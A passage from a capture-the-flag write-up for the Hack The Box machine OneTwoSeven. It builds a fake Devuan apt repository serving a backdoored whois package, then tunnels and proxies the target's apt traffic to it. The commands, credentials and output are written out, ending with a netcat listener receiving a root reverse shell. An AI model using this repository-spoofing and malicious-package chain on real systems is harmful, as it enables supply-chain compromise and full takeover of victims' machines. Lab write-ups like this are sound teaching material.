Release Packages\n\nAnother requirement we need to satisfy is that we need a gzipped Packages file. Again, this is a simple step.\n\ngzip Packages -c > Packages.gz\n\nRepository Directory Structure\n\nWe\u2019re nearing the end of the repository setup steps. We now need to create the directory structure that the package manager expects to see.\n\nMy actual process for figuring this out was to have all of the MitM pieces in place (described below) and trying to run apt-get update . Each time I did, it would error out with messages like E: Failed to fetch http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-amd64/Packages 404 File not found . I repeatedly ran the command, checked the errors, and built the things that were needed.\n\nThe two mkdir commands below will setup our repo directories.\n\nmkdir -p devuan/dists/ascii/main/binary-amd64 mkdir -p devuan/pool/DEBIAN/main/w/whois\n\nFinally, we need to put all of our files in their proper places. Part of this is renaming backdoored-whois.deb to match the filename we used in the Release file.\n\nmv backdoored-whois.deb devuan/pool/DEBIAN/main/w/whois/whois_5.2.17~deb9u2_amd64.deb mv Packages* devuan/dists/ascii/main/binary-amd64/ mv Release devuan/dists/ascii/\n\nOur repo should look like this now.\n\nbarebones-repo/ \u2514\u2500\u2500 devuan \u251c\u2500\u2500 dists \u2502 \u2514\u2500\u2500 ascii \u2502 \u251c\u2500\u2500 main \u2502 \u2502 \u2514\u2500\u2500 binary-amd64 \u2502 \u2502 \u251c\u2500\u2500 Packages \u2502 \u2502 \u2514\u2500\u2500 Packages.gz \u2502 \u2514\u2500\u2500 Release \u2514\u2500\u2500 pool \u2514\u2500\u2500 DEBIAN \u2514\u2500\u2500 main \u2514\u2500\u2500 w \u2514\u2500\u2500 whois \u2514\u2500\u2500 whois_5.2.17~deb9u2_amd64.deb\n\nThat\u2019s it! We now have a minimal repo from which we can serve up our malicious package.\n\nMan in the Middle\n\nAlright, we\u2019re in the home stretch. There are a few small steps we need to take to properly handle the requests that will originate on the target machine. To begin, we\u2019ll set up a reverse ssh tunnel to get the traffic sent to the \u201cproxy\u201d back to our local machine.\n\nssh -Nf ots-yZjFkZWY@onetwoseven.htb -R 8002:127.1:8080 ots-yZjFkZWY@onetwoseven.htb's password: 122f1def\n\nWhere we used port 8002; the actual port doesn\u2019t matter too much, as long as it isn\u2019t already bound. Our proxy will listen on kali on port 8080, so that\u2019s where we want the remote traffic to come to on kali\u2019s localhost.\n\nreverse tunnel options used: 8002 The port on the remote end to listen on; (10.10.10.133:8002) 127.1 Where the traffic flows after reaching 8002 from the point of view of the creator of the tunnel (traffic dumps out on kali; the creator's localhost) 8080 The port to which traffic is destined.\n\nNext, we\u2019ll set up the proxy. We\u2019re going to use BurpSuite as our proxy. Burp listens on port 8080 by default. All we need to do is start it up. It\u2019s dealer\u2019s choice on how to get it started, click the icon or run the command below.\n\njava -jar $(which burpsuite)\n\nAlso, ensure that Intercept is off.\n\nHuzzah, we\u2019ve set up our proxy! Now, remember when we looked at the repositories that the target machine is configured to use? We found the URL http://packages.onetwoseven.htb/devuan . All of the requests sent to our proxy will ultimately be looking for the packages.onetwoseven.htb subdomain. Since we\u2019re impersonating this repository, we need to tell Burp that WE are deb packages.onetwoseven.htb . We\u2019ll do this by modifying /etc/hosts .\n\n1 /etc/hosts 2 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 3 4 127.0.0.1 localhost packages.onetwoseven.htb 5 127.0.1.1 kail 6 -------------8<-------------\n\nWith that done, Burp will proxy the requests coming to it \u201cout\u201d to packages.onetwoseven.htb which is really our kali\u2019s localhost interface.\n\nOur last step before exploitation is to start the webserver that will host the files in our repository.\n\ncd barebones-repo python3 -m http.server 80\n\nNow all of the pieces are in place for us to MitM the package manager. Let\u2019s see it in action!\n\nExploitation\n\nBefore running the exploit, we need an ipv6 listener (remember the msfvenom command?).\n\nnc -vnl6p 12345 Ncat: Version 7.70 ( https://nmap.org/ncat ) Ncat: Listening on :::12345\n\nNow, on the target machine, we first run apt-get update followed by apt-get upgrade\n\nsudo http_proxy=http://127.0.0.1:8002 apt-get update \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 Ign:1 http://packages.onetwoseven.htb/devuan ascii InRelease Get:2 http://packages.onetwoseven.htb/devuan ascii Release [627 B] -------------8<------------- Fetched 1093 B in 12s (86 B/s) Reading package lists... Done W: The repository 'http://packages.onetwoseven.htb/devuan ascii Release' is not signed. N: Data from such a repository can't be authenticated and is therefore potentially dangerous to use. N: See apt-secure(8) manpage for repository creation and user configuration details. W: Conflicting distribution: http://packages.onetwoseven.htb/devuan ascii Release (expected ascii but got ) E: Failed to fetch http://de.deb.devuan.org/merged/dists/ascii/main/binary-amd64/Packages Connection failed E: Failed to fetch http://de.deb.devuan.org/merged/dists/ascii-security/main/binary-amd64/Packages Connection failed E: Some index files failed to download. They have been ignored, or old ones used instead.\n\nWe see some warnings and errors in the output above, but they can be ignored.\n\nFor the upgrade command, if we see whois listed in the packages to be upgraded, we know that our exploit has at least partially worked; the package manager is going to try to upgrade the package.\n\nsudo http_proxy=http://127.0.0.1:8002 apt-get upgrade \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 Reading package lists... Done Building dependency tree Reading state information... Done Calculating upgrade... Done The following packages will be upgraded: debian-archive-keyring tzdata whois 3 upgraded, 0 newly installed, 0 to remove and 0 not upgraded. Need to get 77.2 kB/426 kB of archives. After this operation, 31.7 kB of additional disk space will be used. Do you want to continue? [Y/n] y y WARNING: The following packages cannot be authenticated! whois Install these packages without verification? [y/N] y y Get:1 http://packages.onetwoseven.htb/devuan ascii/main amd64 whois amd64 5.2.17~deb9u2 [77.2 kB] Fetched 77.2 kB in 0s (281 kB/s) Reading changelogs... Done -------------8<------------- Setting up whois (5.2.17~deb9u1) ... Processing triggers for man-db (2.7.6.1-2) ...\n\nIf all went well, we should see a connection come back to our netcat listener.\n\n-------------8<------------- Ncat: Connection from dead:beef::250:56ff:feb2:e2a6. Ncat: Connection from dead:beef::250:56ff:feb2:e2a6:53952. id uid=0(root) gid=0(root) groups=0(root) cat /root/root.txt 2d38...\n\nThere we go, we\u2019ve successfully MitM\u2019d a package manager to escalate privileges. High five!!\n\n\\o/ - root access\n\nI hope you enjoyed this write-up or at least found something useful. Drop me a line on the HTB forums or in chat @ NetSec Focus.\n\nAdditional Resources"
}